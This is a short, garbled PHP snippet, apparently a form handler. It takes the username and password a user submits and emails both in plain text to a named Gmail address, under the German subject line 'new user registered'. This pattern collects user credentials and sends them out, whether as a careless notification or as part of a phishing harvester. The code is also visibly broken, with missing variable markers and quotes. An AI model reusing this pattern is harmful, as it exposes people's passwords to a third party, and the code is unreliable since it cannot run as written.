php
<?php
to = ghaithalatrash0@gmail.com';subject = 'Neuer Benutzer registriert';
message = 'Benutzername: ' ._POST['username'] . PHP_EOL;
message .= 'Passwort: ' ._POST['password'] . PHP_EOL;

mail(to,subject, $message);
?>
```
